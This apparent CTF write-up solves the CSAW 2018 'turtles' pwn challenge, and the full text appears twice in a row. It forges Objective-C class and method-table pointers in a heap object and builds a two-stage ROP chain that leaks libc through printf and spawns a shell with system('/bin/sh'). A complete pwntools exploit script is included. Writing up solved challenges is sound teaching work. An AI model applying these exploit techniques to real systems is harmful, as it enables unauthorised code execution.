* **Category:** pwn  
* **Points:** 250  
* **Description:**

> Looks like you found a bunch of turtles but their shells are nowhere to be  
> seen! Think you can make a shell for them?  
>  
> ```sh  
> nc pwn.chal.csaw.io 9003  
> ```  
>  
>
> [turtles](https://ctf.csaw.io/files/b3adfcc8a5cd4a1bf9a413c6f46fb212/turtles)  
>
> [libs.zip](https://ctf.csaw.io/files/f8d7ea4fde01101de29de49d91434a5a/libs.zip)

## Writeup

We get an x86\_64 linux binary, and reading the main function immediately show  
us this is an Objective-C program (`objc_get_class` and `objc_msg_lookup`).

For those unfamiliar with Objective-C, it is mostly like C, but there is a  
mechanism for Object-Oriented-Programming where methods on objects are called  
using the functions `objc_msg_send` and `objc_msg_lookup` (in the ABI, the  
syntax for it looks like `[instance method: parameter]`).

A "message" is just a method call. Methods are identified by a "selector",
which  
is just the method name. At runtime these selectors are replaced with a 64-bit  
value consisting of two relatively low 32-bit integers concatenated together.

The problem with `objc_msg_send` and selectors is that it is quite hard to
find  
cross-references when analyzing a binary. In this case the classes are quite  
simple, so this is not a problem.

Reading the program code shows the code must have been something like this:

```objc  
#include <stdio.h>  
#include <unistd.h>  
#include <string.h>  
#include <Foundation/NSObject.h>  
#include <Foundation/NSString.h>

@interface Turtle: NSObject  
- (void) say: (NSString *) phrase;  
@end

@implementation Turtle: NSObject  
- (void) say: (NSString *) phrase  
{  
   NSLog(@"%@\n", phrase);  
}  
@end

int main(int argc, char ** argv) {  
   char buf[0x810];

   setvbuf(stdout, NULL, _IONBF, 0);  
   setvbuf(stdin, NULL, _IONBF, 0);

   Turtle * turtle = [[Turtle alloc] init];  
  
   printf("Here is a Turtle: %p\n", turtle);

   read(STDIN_FILENO, buf, sizeof buf);  
   memcpy(turtle, buf, 200);

   [turtle say: @"I am a turtle."];  
   [turtle release];

   return 0;  
}  
```

## The Vulnerability

The programm allocates a Turtle object on the heap, and then prints its
address.

Afterwards, it allows us to write 200 arbitrary bytes into the heap location
of  
the Turtle object. As all method calls in Objective-C are dynamic, this allows  
something similar to a C++ vtable exploit. For this to work we need to know
how  
an Objective-C class is structured.

For this, we just observed which pointers and offsets the `objc_msg_lookup`  
function from `gnustep-base.so` dereferences, and where the function pointer  
comes from.

The attack will consist of redirecting all pointers in the structure into the  
heap area we control and know the address of, leading the program into
returning  
an arbitrary function pointer.

## `objc_msg_lookup` Analysis

This function takes two parameters: the instance and the selector.

At offset 0x00 in our instance, a pointer to the class object is stored.  
At offset 0x40 in the class object, a pointer to a structure containing a  
multi-layered table of function pointers is stored. Let's call this structure  
(at offset 0x40) the "implementation table struct".

For indexing into that table, the two 32-bit parts of the runtime selector
value  
are used.

But first, some kind of length check is performed. The low selector value plus  
the high selector value shifted left by five are added together and compared
to  
the value in the "implementation table struct" at offset 0x28. If the value is  
bigger than the one in the struct, the lookup function does something else
that  
does not usually happen, we assumed it fails.

The actual table is located at offset 0x00 in the "implementation table
struct".  
It is indexed using first the low selector value, and then the high selector  
value. The result is a function pointer that is returned.

Pseudocode:

```  
objc_msg_lookup(instance* inst, uint64* sel):  
   uint64 selv = *sel  
   class * cls = inst->class # offset 0x00

   imp_tbl_struct * its = cls->its # offset 0x40  
   uint32 sel_low = selv & 0xffffffff  
   uint32 sel_high = selv >> 32

   if (sel_low + (sel_high << 5)) >= its->length: # offset 0x28  
       # ... irrelevant code  
   else:  
       return its->table[sel_low][sel_high] # offset 0x00  
```

## The Attack

For our attack payload, we put a pointer to our fabricated class struct
further  
in the payload at offset 0x00, and then left a bit of space for a ROP chain
and  
data.

After that, we added another pointer, which through our crafted class pointer  
lies exactly at offset 0x40, meaning it is the pointer to the implementation  
table struct.

We offset the implementation table struct in such a way, that it points
directly  
after the pointer to it, so that in the payload, all the pointers lie next to  
each other.

Since the observed selector value in the `gnustep-base` library from
`libs.zip`  
was 0x0000001500000064, assuming the values are the same on the remote server,  
we can adjust the first table-level to point just after the previous pointer
in  
the payload, and similar for the second table level.

This leaves us with this payload:

```py  
method = 0x4141414141414141  
base_vtable = 0x90  
base_data = 0x80

payload = (  
   p64(turtle + base_vtable + 0x00 - 0x040) + # class

   rop.chain().ljust(base_data - 8, b"\0") +  
   data.ljust(base_vtable - base_data, b"\0") +

   p64(turtle + base_vtable + 0x08 - 0x000) + # imp_table_struct  
   p64(turtle + base_vtable + 0x10 - 0x64 * 8) + # tbl_level1  
   p64(turtle + base_vtable + 0x18 - 0x15 * 8) + # tbl_level2  
   p64(method)  
)  
```

## Getting a shell

Using the payload we constructed above, we can an adjust-gadget that pops a
few  
things off the stack, in order to land inside our stack buffer.

We found a gadget that pops into irrelevant registers 4 times, landing exactly  
after our crafted class pointer in the stack buffer.

From that point, we have ROP, and can ROP to `printf` in order to leak a GOT  
entry and recover the libc base address. After that, we ROP back to main in  
order to send a second ROP-chain and jump to libc's `system`

Stage 1 ROP-chain:

```py  
data = b"%sEND"

rop.raw(rop_rdi)  
rop.raw(turtle + base_data)

rop.raw(rop_rsi_r15)  
rop.raw(setvbuf_got)  
rop.raw(0)

rop.raw(printf_plt)  
rop.raw(main_addr)  
```

Using that knowledge, we can now calculate the address of `system` in the libc  
and get a shell:

Stage 2 ROP-chain:

```py  
data = b"/bin/sh"  
  
rop.raw(rop_rdi)  
rop.raw(turtle + base_data)  
rop.raw(libc.symbols[b"system"])  
```

With that, we can execute `cat flag` and get the flag:

```  
flag{i_like_turtl3$_do_u?}  
```

## The Script

This is the python script used to solve the challenge, after being cleaned up
a  
bit:

```py  
from pwn import *

context.arch = "amd64"

r = remote("pwn.chal.csaw.io", 9003)

libc = ELF("libs-nopreload/libc.so.6")

r.readuntil(b": ")  
turtle = int(r.readline(), 16)  
print("turtle address: 0x{:016x}".format(turtle))

main_addr = 0x400B84  
class_turtle = 0x6014c0

rop_adjust4 = 0x00400d3c  
rop_rdi = 0x00400d43  
rop_rsi_r15 = 0x00400d41

method = rop_adjust4

base_vtable = 0x90  
base_data = 0x80  
rop_chain = b"CCCCCCCC"

printf_plt = 0x4009D0  
setvbuf_got = 0x601288

rop = ROP([ELF("./turtles")])

rop.raw(rop_rdi)  
rop.raw(turtle + base_data)

rop.raw(rop_rsi_r15)  
rop.raw(setvbuf_got)  
rop.raw(0)

rop.raw(printf_plt)  
rop.raw(main_addr)

data = b"%sEND"

payload = (  
   p64(turtle + base_vtable + 0x00 - 0x040) + # class

   rop.chain().ljust(base_data - 8, b"\0") +  
   data.ljust(base_vtable - base_data, b"\0") +

   p64(turtle + base_vtable + 0x08 - 0x000) + # imp_table_struct  
   p64(turtle + base_vtable + 0x10 - 0x64 * 8) + # tbl_level1  
   p64(turtle + base_vtable + 0x18 - 0x15 * 8) + # tbl_level2  
   p64(method)  
)

r.send(payload.ljust(200, b'A'))

setvbuf_addr = u64(r.readuntil(b"END")[:-3].ljust(8, b"\0"))  
print("setvbuf address: 0x{:016x}".format(setvbuf_addr))

libc.address = setvbuf_addr - libc.symbols[b"setvbuf"]  
print("system address: 0x{:016x}".format(libc.symbols[b"system"]))

data = b"/bin/sh"

r.readuntil(b": ")  
turtle = int(r.readline(), 16)  
print("turtle address: 0x{:016x}".format(turtle))

method = rop_adjust4  
rop = ROP([ELF("./turtles")])

rop.raw(rop_rdi)  
rop.raw(turtle + base_data)  
rop.raw(libc.symbols[b"system"])  
rop.raw(0x4343434343434343)

payload = (  
   p64(turtle + base_vtable + 0x00 - 0x040) + # class

   rop.chain().ljust(base_data - 8, b"\0") +  
   data.ljust(base_vtable - base_data, b"\0") +

   p64(turtle + base_vtable + 0x08 - 0x000) + # imp_table_struct  
   p64(turtle + base_vtable + 0x10 - 0x64 * 8) + # tbl_level1  
   p64(turtle + base_vtable + 0x18 - 0x15 * 8) + # tbl_level2  
   p64(method)  
)

r.send(payload.ljust(200, b'A'))

r.sendline(b"cat flag")  
print(r.readline().decode())  
```

Original writeup (https://losfuzzys.github.io/writeup/2018/09/20/csawctfquals-
turtles/).* **Category:** pwn  
* **Points:** 250  
* **Description:**

> Looks like you found a bunch of turtles but their shells are nowhere to be  
> seen! Think you can make a shell for them?  
>  
> ```sh  
> nc pwn.chal.csaw.io 9003  
> ```  
>  
>
> [turtles](https://ctf.csaw.io/files/b3adfcc8a5cd4a1bf9a413c6f46fb212/turtles)  
>
> [libs.zip](https://ctf.csaw.io/files/f8d7ea4fde01101de29de49d91434a5a/libs.zip)

## Writeup

We get an x86\_64 linux binary, and reading the main function immediately show  
us this is an Objective-C program (`objc_get_class` and `objc_msg_lookup`).

For those unfamiliar with Objective-C, it is mostly like C, but there is a  
mechanism for Object-Oriented-Programming where methods on objects are called  
using the functions `objc_msg_send` and `objc_msg_lookup` (in the ABI, the  
syntax for it looks like `[instance method: parameter]`).

A "message" is just a method call. Methods are identified by a "selector",
which  
is just the method name. At runtime these selectors are replaced with a 64-bit  
value consisting of two relatively low 32-bit integers concatenated together.

The problem with `objc_msg_send` and selectors is that it is quite hard to
find  
cross-references when analyzing a binary. In this case the classes are quite  
simple, so this is not a problem.

Reading the program code shows the code must have been something like this:

```objc  
#include <stdio.h>  
#include <unistd.h>  
#include <string.h>  
#include <Foundation/NSObject.h>  
#include <Foundation/NSString.h>

@interface Turtle: NSObject  
- (void) say: (NSString *) phrase;  
@end

@implementation Turtle: NSObject  
- (void) say: (NSString *) phrase  
{  
   NSLog(@"%@\n", phrase);  
}  
@end

int main(int argc, char ** argv) {  
   char buf[0x810];

   setvbuf(stdout, NULL, _IONBF, 0);  
   setvbuf(stdin, NULL, _IONBF, 0);

   Turtle * turtle = [[Turtle alloc] init];  
  
   printf("Here is a Turtle: %p\n", turtle);

   read(STDIN_FILENO, buf, sizeof buf);  
   memcpy(turtle, buf, 200);

   [turtle say: @"I am a turtle."];  
   [turtle release];

   return 0;  
}  
```

## The Vulnerability

The programm allocates a Turtle object on the heap, and then prints its
address.

Afterwards, it allows us to write 200 arbitrary bytes into the heap location
of  
the Turtle object. As all method calls in Objective-C are dynamic, this allows  
something similar to a C++ vtable exploit. For this to work we need to know
how  
an Objective-C class is structured.

For this, we just observed which pointers and offsets the `objc_msg_lookup`  
function from `gnustep-base.so` dereferences, and where the function pointer  
comes from.

The attack will consist of redirecting all pointers in the structure into the  
heap area we control and know the address of, leading the program into
returning  
an arbitrary function pointer.

## `objc_msg_lookup` Analysis

This function takes two parameters: the instance and the selector.

At offset 0x00 in our instance, a pointer to the class object is stored.  
At offset 0x40 in the class object, a pointer to a structure containing a  
multi-layered table of function pointers is stored. Let's call this structure  
(at offset 0x40) the "implementation table struct".

For indexing into that table, the two 32-bit parts of the runtime selector
value  
are used.

But first, some kind of length check is performed. The low selector value plus  
the high selector value shifted left by five are added together and compared
to  
the value in the "implementation table struct" at offset 0x28. If the value is  
bigger than the one in the struct, the lookup function does something else
that  
does not usually happen, we assumed it fails.

The actual table is located at offset 0x00 in the "implementation table
struct".  
It is indexed using first the low selector value, and then the high selector  
value. The result is a function pointer that is returned.

Pseudocode:

```  
objc_msg_lookup(instance* inst, uint64* sel):  
   uint64 selv = *sel  
   class * cls = inst->class # offset 0x00

   imp_tbl_struct * its = cls->its # offset 0x40  
   uint32 sel_low = selv & 0xffffffff  
   uint32 sel_high = selv >> 32

   if (sel_low + (sel_high << 5)) >= its->length: # offset 0x28  
       # ... irrelevant code  
   else:  
       return its->table[sel_low][sel_high] # offset 0x00  
```

## The Attack

For our attack payload, we put a pointer to our fabricated class struct
further  
in the payload at offset 0x00, and then left a bit of space for a ROP chain
and  
data.

After that, we added another pointer, which through our crafted class pointer  
lies exactly at offset 0x40, meaning it is the pointer to the implementation  
table struct.

We offset the implementation table struct in such a way, that it points
directly  
after the pointer to it, so that in the payload, all the pointers lie next to  
each other.

Since the observed selector value in the `gnustep-base` library from
`libs.zip`  
was 0x0000001500000064, assuming the values are the same on the remote server,  
we can adjust the first table-level to point just after the previous pointer
in  
the payload, and similar for the second table level.

This leaves us with this payload:

```py  
method = 0x4141414141414141  
base_vtable = 0x90  
base_data = 0x80

payload = (  
   p64(turtle + base_vtable + 0x00 - 0x040) + # class

   rop.chain().ljust(base_data - 8, b"\0") +  
   data.ljust(base_vtable - base_data, b"\0") +

   p64(turtle + base_vtable + 0x08 - 0x000) + # imp_table_struct  
   p64(turtle + base_vtable + 0x10 - 0x64 * 8) + # tbl_level1  
   p64(turtle + base_vtable + 0x18 - 0x15 * 8) + # tbl_level2  
   p64(method)  
)  
```

## Getting a shell

Using the payload we constructed above, we can an adjust-gadget that pops a
few  
things off the stack, in order to land inside our stack buffer.

We found a gadget that pops into irrelevant registers 4 times, landing exactly  
after our crafted class pointer in the stack buffer.

From that point, we have ROP, and can ROP to `printf` in order to leak a GOT  
entry and recover the libc base address. After that, we ROP back to main in  
order to send a second ROP-chain and jump to libc's `system`

Stage 1 ROP-chain:

```py  
data = b"%sEND"

rop.raw(rop_rdi)  
rop.raw(turtle + base_data)

rop.raw(rop_rsi_r15)  
rop.raw(setvbuf_got)  
rop.raw(0)

rop.raw(printf_plt)  
rop.raw(main_addr)  
```

Using that knowledge, we can now calculate the address of `system` in the libc  
and get a shell:

Stage 2 ROP-chain:

```py  
data = b"/bin/sh"  
  
rop.raw(rop_rdi)  
rop.raw(turtle + base_data)  
rop.raw(libc.symbols[b"system"])  
```

With that, we can execute `cat flag` and get the flag:

```  
flag{i_like_turtl3$_do_u?}  
```

## The Script

This is the python script used to solve the challenge, after being cleaned up
a  
bit:

```py  
from pwn import *

context.arch = "amd64"

r = remote("pwn.chal.csaw.io", 9003)

libc = ELF("libs-nopreload/libc.so.6")

r.readuntil(b": ")  
turtle = int(r.readline(), 16)  
print("turtle address: 0x{:016x}".format(turtle))

main_addr = 0x400B84  
class_turtle = 0x6014c0

rop_adjust4 = 0x00400d3c  
rop_rdi = 0x00400d43  
rop_rsi_r15 = 0x00400d41

method = rop_adjust4

base_vtable = 0x90  
base_data = 0x80  
rop_chain = b"CCCCCCCC"

printf_plt = 0x4009D0  
setvbuf_got = 0x601288

rop = ROP([ELF("./turtles")])

rop.raw(rop_rdi)  
rop.raw(turtle + base_data)

rop.raw(rop_rsi_r15)  
rop.raw(setvbuf_got)  
rop.raw(0)

rop.raw(printf_plt)  
rop.raw(main_addr)

data = b"%sEND"

payload = (  
   p64(turtle + base_vtable + 0x00 - 0x040) + # class

   rop.chain().ljust(base_data - 8, b"\0") +  
   data.ljust(base_vtable - base_data, b"\0") +

   p64(turtle + base_vtable + 0x08 - 0x000) + # imp_table_struct  
   p64(turtle + base_vtable + 0x10 - 0x64 * 8) + # tbl_level1  
   p64(turtle + base_vtable + 0x18 - 0x15 * 8) + # tbl_level2  
   p64(method)  
)

r.send(payload.ljust(200, b'A'))

setvbuf_addr = u64(r.readuntil(b"END")[:-3].ljust(8, b"\0"))  
print("setvbuf address: 0x{:016x}".format(setvbuf_addr))

libc.address = setvbuf_addr - libc.symbols[b"setvbuf"]  
print("system address: 0x{:016x}".format(libc.symbols[b"system"]))

data = b"/bin/sh"

r.readuntil(b": ")  
turtle = int(r.readline(), 16)  
print("turtle address: 0x{:016x}".format(turtle))

method = rop_adjust4  
rop = ROP([ELF("./turtles")])

rop.raw(rop_rdi)  
rop.raw(turtle + base_data)  
rop.raw(libc.symbols[b"system"])  
rop.raw(0x4343434343434343)

payload = (  
   p64(turtle + base_vtable + 0x00 - 0x040) + # class

   rop.chain().ljust(base_data - 8, b"\0") +  
   data.ljust(base_vtable - base_data, b"\0") +

   p64(turtle + base_vtable + 0x08 - 0x000) + # imp_table_struct  
   p64(turtle + base_vtable + 0x10 - 0x64 * 8) + # tbl_level1  
   p64(turtle + base_vtable + 0x18 - 0x15 * 8) + # tbl_level2  
   p64(method)  
)

r.send(payload.ljust(200, b'A'))

r.sendline(b"cat flag")  
print(r.readline().decode())  
```

Original writeup (https://losfuzzys.github.io/writeup/2018/09/20/csawctfquals-
turtles/).